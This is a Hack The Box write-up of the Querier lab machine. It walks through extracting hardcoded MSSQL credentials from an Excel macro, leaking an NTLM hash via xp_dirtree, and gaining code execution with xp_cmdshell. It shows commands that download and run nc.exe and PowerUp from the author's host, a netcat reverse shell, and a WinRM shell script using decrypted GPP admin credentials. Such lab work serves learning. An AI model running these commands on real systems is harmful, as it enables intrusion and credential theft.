---
layout: single
title: Querier - Hack The Box
excerpt: "To solve Querier, we find an Excel spreadsheet that contains a VBA macro then use Responder to capture NTLM hashes from the server by forcing it to connect back to our machine with `xp_dirtree`. After cracking the hash, we gain RCE on the server by using the standard `xp_cmdshell` command. The Administator credentials are found in a Group Policy Preference file."
date: 2019-06-22
classes: wide
header:
  teaser: /assets/images/htb-writeup-querier/querier_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - hardcoded credentials
  - mssql
  - gpp
  - winrm
  - impacket
  - responder
---

![](/assets/images/htb-writeup-querier/querier_logo.png)

To solve Querier, we find an Excel spreadsheet that contains a VBA macro then use Responder to capture NTLM hashes from the server by forcing it to connect back to our machine with `xp_dirtree`. After cracking the hash, we gain RCE on the server by using the standard `xp_cmdshell` command. The Administator credentials are found in a Group Policy Preference file.

## Summary

- An SMB share contains a binary file with hardcoded MSSQL credentials
- We can log in to MSSQL and get the `mssql-svc` user hash using `xp_dirtree` and responder
- Logging in as `mssql-svc` to MSSQL we can use `xp_cmdshell` to get RCE
- Using PowerUp, we find the administrator password in a GPP xml file

## Detailed steps

Port scan shows SMB is open, along with MSSQL and WinRM.

```
# nmap -sC -sV -p- 10.10.10.125 -oA querier
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-16 00:56 EST
Nmap scan report for querier.htb (10.10.10.125)
Host is up (0.013s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-02-16T18:52:53
|_Not valid after:  2049-02-16T18:52:53
|_ssl-date: 2019-02-16T18:54:24+00:00; +12h57m10s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 12h57m10s, deviation: 0s, median: 12h57m09s
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server
|_    TCP port: 1433
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-02-16 13:54:23
|_  start_date: N/A
```

### SMB share enumeration

The share enumeration didn't work reliably when I first did the box. For some reason I would get random connection timeouts. I had to try the enumeration a few times, I don't know why though.

```
# smbmap -u invalid -H 10.10.10.125
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.125...
[+] IP: 10.10.10.125:445	Name: querier.htb
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	Reports                                           	READ ONLY
```

There a `Reports` share that our user has read access to. I logged on using smbclient and downloaded the file.

```
# smbclient -U QUERIER/invalid //10.10.10.125/Reports
Enter QUERIER\invalid's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

		6469119 blocks of size 4096. 1572541 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (124.4 KiloBytes/sec) (average 124.4 KiloBytes/sec)
```

The 2007+ Microsoft Office format is basically a zip compressed file. We can see the contents of that Macro file without using LibreOffice with:

```
# file 'Currency Volume Report.xlsm'
Currency Volume Report.xlsm: Microsoft Excel 2007+

# unzip 'Currency Volume Report.xlsm'
Archive:  Currency Volume Report.xlsm
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/vbaProject.bin
  inflating: docProps/core.xml
  inflating: docProps/app.xml
```

I checked out all the files and eventually found a connection string inside the `vbaProject.bin` binary file:

```
# strings vbaProject.bin
 macro to pull data for client volume reports
n.Conn]
Open
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

So it seems that the username and password for the MSSQL server have been hardcoded into the macro. We can also see this by opening the file in LibreOffice and checking out the macros:

![](/assets/images/htb-writeup-querier/mssql_credentials.png)

- Username: `reporting`
- Password: `PcwTWTHRwryjc$c6`

### Getting RCE through MSSQL

I used the Impacket `mssqlclient.py` to connect to the database:

```
# /usr/share/doc/python-impacket/examples/mssqlclient.py -windows-auth querier/reporting@querier.htb
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

The first thing I tried was to use `xp_cmdshell` to run commands but the current user doesn't have enough privileges:

```
SQL> xp_cmdshell "whoami";
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL> EXEC sp_configure 'show advanced options', 1;
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
SQL> RECONFIGURE;
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
```

However, we can trigger an SMB connection back to us with `xp_dirtree` and steal the NTLMv2 hash from the server using Responder:

```
SQL> xp_dirtree "\\10.10.14.23\gimmesomehashes"
```

![](/assets/images/htb-writeup-querier/responder.png)

The account is using a weak password that we can crack with the `rockyou.txt` wordlist:

```
# john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1 0g 0:00:00:06 DONE (2019-02-17 19:17) 0g/s 428905p/s 428905c/s 428905C/s CHIKITITA1
3 0g 0:00:00:06 DONE (2019-02-17 19:17) 0g/s 406211p/s 406211c/s 406211C/s Pippa1862
2 0g 0:00:00:06 DONE (2019-02-17 19:17) 0g/s 421156p/s 421156c/s 421156C/s HIKID25
4 1g 0:00:00:06 DONE (2019-02-17 19:17) 0.1515g/s 339332p/s 339332c/s 339332C/s corporate568
Waiting for 3 children to terminate
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password is: `corporate568`

Now we can log in with that the `mssql-svc` account then enable `xp_cmdshell` and get RCE:

```
# /usr/share/doc/python-impacket/examples/mssqlclient.py -windows-auth querier/mssql-svc@querier.htb
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> EXEC sp_configure 'show advanced options', 1;
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> xp_cmdshell "dir c:\users"
output

--------------------------------------------------------------------------------

 Volume in drive C has no label.
 Volume Serial Number is FE98-F373
NULL
 Directory of c:\users
NULL
01/28/2019  11:41 PM    <DIR>          .
01/28/2019  11:41 PM    <DIR>          ..
01/28/2019  10:17 PM    <DIR>          Administrator
01/28/2019  11:42 PM    <DIR>          mssql-svc
01/28/2019  10:17 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   6,438,649,856 bytes free
NULL
```

At first I tried running a Nishang reverse shell but Windows Defender caught it. Then I tried downloading netcat with certutil.exe but that also was caught. So I used powershell instead to download netcat and then spawn a shell:

```
SQL> xp_cmdshell "powershell -command Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -OutFile c:\programdata\nc.exe"
```

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.125] 49713
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc

C:\Windows\system32>type c:\users\mssql-svc\desktop\user.txt
type c:\users\mssql-svc\desktop\user.txt
c37b41b...
```

### Privesc

I used Powersploit's PowerUp module to do some recon on the box and found the administrator credentials stored in the Group Policy Preference (GPP) xml file. As explained on many other blogs, that file is AES encrypted but the key was leaked on MSDN a couple of years ago so PowerUp is able to decrypt it automatically.

```
C:\Windows\system32>powershell

PS C:\Windows\system32> IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.23/PowerUp.ps1")
PS C:\Windows\system32> invoke-allchecks
[*] Checking for cached Group Policy Preferences .xml files....


Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
            C:\Windows\system32>powershell
```

Password: `MyUnclesAreMarioAndLuigi!!1!`

Using Alamot's WinRM ruby script, I was able to log in as `administrator`:

```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'http://10.10.10.125:5985/wsman',
  user: 'querier\administrator',
  password: 'MyUnclesAreMarioAndLuigi!!1!',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```

```
# ruby querier.rb
PS querier\administrator@QUERIER Documents> whoami
querier\administrator
PS querier\administrator@QUERIER Documents> type c:\users\administrator\desktop\root.txt
b19c37...
```
